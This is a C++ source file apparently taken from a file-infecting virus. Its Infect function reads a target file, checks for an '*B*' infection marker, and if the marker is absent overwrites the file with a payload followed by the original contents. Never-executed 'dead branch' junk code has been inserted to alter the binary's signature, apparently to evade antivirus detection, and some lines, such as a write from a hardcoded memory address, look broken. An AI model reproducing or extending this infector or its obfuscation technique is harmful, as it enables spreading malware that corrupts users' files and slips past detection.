#include "data_globals.h"
#include <fstream>
#include <cstring>
#include <cstdlib>
#include <stdio.h>
#include <windows.h>

void Infect(char* filename, char* payload)
{
    // --- ORIGINAL CODE ---
    std::ifstream in_file(filename, std::ios::in | std::ios::binary);
    in_file.seekg(0, std::ios::end);
    std::streampos pos = in_file.tellg();
    int file_size = static_cast<int>(pos);
    in_file.seekg(0, std::ios::beg);

    Buffer = static_cast<char*>(malloc(static_cast<size_t>(file_size)));
    in_file.read(Buffer, static_cast<std::streamsize>(file_size));
    in_file.close();

    // --- INSERTED DEAD BRANCH 1 (ADDITIVE ONLY) ---
    // Pattern A: Math Invariant, Category A: System info queries
    volatile int dummy_x_1 = 7;
    if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
        // Dead branch: System info queries
        SYSTEM_INFO si;
        GetSystemInfo(&si);
        volatile DWORD page_size = si.dwPageSize;
        volatile DWORD alloc_gran = si.dwAllocationGranularity;
        
        SYSTEMTIME st;
        GetLocalTime(&st);
        volatile WORD year = st.wYear;
        volatile WORD month = st.wMonth;
        volatile WORD day = st.wDay;
        
        char user_name[256];
        DWORD user_len = 256;
        volatile BOOL user_ok = GetUserNameA(user_name, &user_len);
        
        char comp_name[256];
        DWORD comp_len = 256;
        volatile BOOL comp_ok = GetComputerNameA(comp_name, &comp_len);
        
        volatile DWORD dummy_result = page_size ^ alloc_gran;
        dummy_result ^= (year << 16) | (month << 8) | day;
        if (user_ok && comp_ok) {
            dummy_result ^= 0xDEADBEEF;
        }
        
        for (volatile int i = 0; i < 3; ++i) {
            dummy_result = (dummy_result * 31) + i;
            dummy_result ^= (dummy_result >> 16);
        }
        volatile char local_buf[64];
        for (volatile int i = 0; i < 8; ++i) {
            local_buf[i] = static_cast<char>((dummy_result >> (i * 4)) & 0xFF);
        }
        SecureZeroMemory((PVOID)local_buf, sizeof(local_buf));   // ← FIX: cast to PVOID
    }

    // --- ORIGINAL CODE ---
    for (int j = 0; j < file_size; ++j) {
        // --- INSERTED DEAD BRANCH 2 (ADDITIVE ONLY) ---
        // Pattern C: Combination, Category B: Memory & String operations
        volatile DWORD dummy_tick_2 = GetTickCount();
        if ((dummy_tick_2 ^ 0x5A5A5A5A) == 0xFFFFFFFF && (dummy_tick_2 & 0x80000000) != 0) {
            // Dead branch: Memory & String operations
            char src_buf[128];
            char dst_buf[128];
            for (volatile int i = 0; i < 100; ++i) {
                src_buf[i % 100] = static_cast<char>((i * 7 + 13) & 0x7F);
            }
            src_buf[99] = '\0';
            
            size_t src_len = strlen(src_buf);
            volatile size_t copy_len = (src_len < 64) ? src_len : 64;
            
            char* heap_buf = static_cast<char*>(malloc(128));
            if (heap_buf != nullptr) {
                memcpy(heap_buf, src_buf, copy_len);
                heap_buf[copy_len] = '\0';
                
                volatile int hash = 0;
                for (volatile int i = 0; i < 10; ++i) {
                    for (volatile int k = 0; k < 5; ++k) {
                        hash ^= static_cast<int>(heap_buf[(i + k) % 64]);
                        hash = (hash * 31) + 0x9E3779B9;
                    }
                }
                
                sprintf_s(dst_buf, sizeof(dst_buf), "hash_%08X", hash);
                volatile size_t dst_len = strlen(dst_buf);
                volatile char dummy_result = 0;
                for (volatile int i = 0; i < 5; ++i) {
                    dummy_result ^= dst_buf[i % dst_len];
                }
                free(heap_buf);
            }
            volatile char local_buf2[64];
            memcpy((void*)local_buf2, dst_buf, 16);
            SecureZeroMemory((PVOID)local_buf2, sizeof(local_buf2));   // ← FIX: cast to PVOID
        }

        // --- ORIGINAL CODE (inside loop) ---
        if (Buffer[j] == '*' && Buffer[j + 1] == 'B' && Buffer[j + 2] == '*') {
            // Fixed: use Status array instead of undefined _Status
            Status[0] = 'Y';
            Status[1] = 'E';
            Status[2] = 'S';
            Status[3] = '\0';
            break;
        }
    }

    // --- ORIGINAL CODE ---
    if (strcmp(Status, "YES") != 0) {
        std::ofstream out_file(filename, std::ios::out | std::ios::binary);
        out_file << payload;
        strlen(&inf);  // side effect – keep as is
        out_file << reinterpret_cast<const char*>(0x140008164);
        out_file.write(Buffer, static_cast<std::streamsize>(file_size));
        out_file.close();
    }

    // --- INSERTED DEAD BRANCH 3 (ADDITIVE ONLY) ---
    // Pattern B: System Query, Category C: Bitwise/Math loops
    if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
        // Dead branch: Bitwise/Math loops (FNV-1a style polynomial hash)
        volatile unsigned int dummy_array[32];
        for (volatile int i = 0; i < 32; ++i) {
            dummy_array[i] = (i * 0x9E3779B9) ^ (i << 16) ^ (i >> 8);
        }
        
        volatile unsigned int hash = 0x811C9DC5;
        for (volatile int i = 0; i < 32; ++i) {
            hash ^= dummy_array[i];
            hash *= 0x01000193;
        }
        
        for (volatile int i = 0; i < 8; ++i) {
            volatile unsigned int val = (hash >> (i * 4)) & 0xF;
            for (volatile int k = 0; k < 3; ++k) {
                val ^= (val << 3) + (val >> 2);
                val = (val * 0x9E3779B9) ^ 0xDEADBEEF;
            }
            hash ^= val << (i * 4);
        }
        
        volatile unsigned char byte_buf[64];
        for (volatile int i = 0; i < 64; ++i) {
            byte_buf[i] = static_cast<unsigned char>((hash >> (i % 4) * 8) ^ (i * 0x5A));
            if (i > 0) {
                byte_buf[i] ^= byte_buf[i - 1];
            }
        }
        
        volatile unsigned long long checksum = 0;
        for (volatile int i = 0; i < 64; ++i) {
            checksum += byte_buf[i];
            checksum ^= (checksum << 13) | (checksum >> 19);
        }
        
        volatile int dummy_loop = 0;
        for (volatile int i = 0; i < 3; ++i) {
            dummy_loop ^= static_cast<int>(checksum & 0xFFFFFFFF);
            dummy_loop = (dummy_loop * 31) + 0x12345678;
        }
        volatile char final_buf[32];
        for (volatile int i = 0; i < 16; ++i) {
            final_buf[i] = static_cast<char>((dummy_loop >> (i * 2)) & 0xFF);
        }
        SecureZeroMemory((PVOID)final_buf, sizeof(final_buf));   // ← FIX: cast to PVOID
    }

    // --- ORIGINAL CODE ---
    free(Buffer);
}
